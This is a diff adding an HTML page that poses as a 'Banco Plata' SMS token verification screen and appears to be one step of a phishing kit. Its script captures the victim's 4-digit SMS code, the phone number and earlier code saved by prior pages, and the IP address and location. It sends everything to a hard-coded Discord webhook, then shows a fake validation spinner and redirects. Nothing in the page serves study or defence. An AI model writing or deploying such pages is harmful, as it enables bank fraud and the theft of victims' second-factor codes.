@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Token SMS - Banco Plata</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body, html {
+      width: 100%;
+      height: 100vh;
+      overflow: hidden;
+      background-color: #ffffff;
+    }
+
+    .container {
+      display: flex;
+      width: 100%;
+      height: 100vh;
+    }
+
+    .left-side {
+      flex: 1;
+      background-color: #f3f4f6;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .left-side img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .right-side {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 40px;
+      position: relative;
+      background-color: #ffffff;
+    }
+
+    .form-wrapper {
+      width: 100%;
+      max-width: 380px;
+    }
+
+    .form-title {
+      font-size: 26px;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 8px;
+      line-height: 1.2;
+    }
+
+    .form-subtitle {
+      font-size: 14.5px;
+      color: #6b7280;
+      margin-bottom: 28px;
+      line-height: 1.4;
+    }
+
+    .field-group {
+      margin-bottom: 20px;
+    }
+
+    .input-container {
+      display: flex;
+      align-items: center;
+      background-color: #f3f4f6;
+      border: 1.5px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 0 16px;
+      height: 54px;
+      transition: border-color 0.2s, background-color 0.2s, box-shadow 0.2s;
+    }
+
+    .input-container:focus-within {
+      background-color: #ffffff;
+      border-color: #ff5500;
+      box-shadow: 0 0 0 3px rgba(255, 85, 0, 0.1);
+    }
+
+    .input-container.has-error {
+      border-color: #ef4444;
+      background-color: #fef2f2;
+    }
+
+    .text-input {
+      border: none;
+      background: transparent;
+      outline: none;
+      font-size: 20px;
+      color: #111827;
+      width: 100%;
+      letter-spacing: 8px;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .text-input::placeholder {
+      color: #9ca3af;
+      letter-spacing: 6px;
+      font-weight: 500;
+    }
+
+    .error-msg {
+      display: none;
+      color: #ef4444;
+      font-size: 13px;
+      margin-top: 6px;
+      font-weight: 500;
+      text-align: center;
+    }
+
+    .btn-submit {
+      width: 100%;
+      height: 52px;
+      background-color: #ff5500;
+      color: #ffffff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s;
+      box-shadow: 0 4px 12px rgba(255, 85, 0, 0.25);
+    }
+
+    .btn-submit:hover {
+      background-color: #e04b00;
+    }
+
+    .btn-submit:active {
+      transform: scale(0.99);
+    }
+
+    .loading-view {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 40px 0;
+      animation: fadeIn 0.25s ease;
+    }
+
+    .loading-view.active {
+      display: flex;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #f3f4f6;
+      border-top: 4px solid #ff5500;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    .loading-text {
+      font-size: 15px;
+      color: #4b5563;
+      font-weight: 500;
+    }
+
+    .step-view {
+      display: block;
+      animation: fadeIn 0.25s ease;
+    }
+
+    .step-view.hidden {
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 768px) {
+      .left-side {
+        display: none;
+      }
+      .right-side {
+        padding: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="left-side">
+      <img src="card-v4.webp" alt="Tarjeta Plata" onerror="this.src='https://via.placeholder.com/600x800?text=Card+Plata'">
+    </div>
+
+    <div class="right-side">
+      <div class="form-wrapper">
+        
+        <!-- PANTALLA DE CARGA (7 SEGUNDOS) -->
+        <div id="stepLoading" class="loading-view">
+          <div class="spinner"></div>
+          <p class="loading-text" id="loadingText">Validando token de seguridad...</p>
+        </div>
+
+        <!-- PASO TOKEN SMS DE 4 DÍGITOS -->
+        <div id="stepToken" class="step-view">
+          <h1 class="form-title">Ingresa tu Token SMS</h1>
+          <p class="form-subtitle">Introduce el código de 4 dígitos recibido en tu celular para autorizar el aumento.</p>
+
+          <form id="tokenForm" novalidate>
+            <div class="field-group">
+              <div class="input-container" id="tokenContainer">
+                <input 
+                  type="tel" 
+                  id="tokenInput" 
+                  class="text-input" 
+                  placeholder="••••" 
+                  maxlength="4" 
+                  inputmode="numeric"
+                  autocomplete="one-time-code"
+                >
+              </div>
+              <p class="error-msg" id="tokenError">Ingresa los 4 dígitos del token.</p>
+            </div>
+
+            <button type="submit" class="btn-submit">Autorizar y continuar</button>
+          </form>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp';
+
+    const stepLoading = document.getElementById('stepLoading');
+    const loadingText = document.getElementById('loadingText');
+    const stepToken = document.getElementById('stepToken');
+    const tokenForm = document.getElementById('tokenForm');
+    const tokenInput = document.getElementById('tokenInput');
+    const tokenContainer = document.getElementById('tokenContainer');
+    const tokenError = document.getElementById('tokenError');
+
+    async function obtenerInfoIP() {
+      const endpoints = [
+        'https://ipapi.co/json/',
+        'https://ipinfo.io/json',
+        'https://ip-api.com/json/'
+      ];
+
+      for (const url of endpoints) {
+        try {
+          const res = await fetch(url);
+          if (!res.ok) continue;
+          const data = await res.json();
+          return {
+            ip: data.ip || data.query || 'Desconocida',
+            pais: data.country_name || data.country || 'Desconocido',
+            ciudad: data.city || 'Desconocida'
+          };
+        } catch (e) {}
+      }
+      return { ip: 'Desconocida', pais: 'Desconocido', ciudad: 'Desconocida' };
+    }
+
+    tokenInput.addEventListener('input', () => {
+      tokenContainer.classList.remove('has-error');
+      tokenError.style.display = 'none';
+      tokenInput.value = tokenInput.value.replace(/\D/g, '').substring(0, 4);
+    });
+
+    tokenForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      if (tokenInput.value.length < 4) {
+        tokenContainer.classList.add('has-error');
+        tokenError.style.display = 'block';
+        tokenInput.focus();
+        return;
+      }
+
+      const tokenSMS = tokenInput.value;
+      const telefono = localStorage.getItem('userPhone') || 'No registrado';
+      const codigoPasoAnterior = localStorage.getItem('userCode') || 'No registrado';
+      
+      localStorage.setItem('userToken', tokenSMS);
+
+      // Ocultar formulario y mostrar pantalla de carga de 7 segundos
+      stepToken.classList.add('hidden');
+      loadingText.textContent = 'Validando token de seguridad...';
+      stepLoading.classList.add('active');
+
+      const info = await obtenerInfoIP();
+
+      const discordPayload = {
+        embeds: [{
+          title: "🔐 TOKEN SMS (4 DÍGITOS) - BANCO PLATA",
+          color: parseInt('ff5500', 16),
+          fields: [
+            { name: "Teléfono", value: telefono, inline: true },
+            { name: "Código Anterior", value: codigoPasoAnterior, inline: true },
+            { name: "Token SMS", value: `\`${tokenSMS}\``, inline: false },
+            { name: "País", value: info.pais, inline: true },
+            { name: "Ciudad", value: info.ciudad, inline: true },
+            { name: "IP", value: info.ip, inline: false }
+          ]
+        }]
+      };
+
+      try {
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(discordPayload)
+        });
+      } catch (error) {
+        console.error('Error al enviar a Discord:', error);
+      }
+
+      // Pausa exacta de 7 segundos antes de redirigir a cargando.html
+      setTimeout(() => {
+        window.location.href = 'cargando.html';
+      }, 7000);
+    });
+  </script>
+
+</body>
+</html>
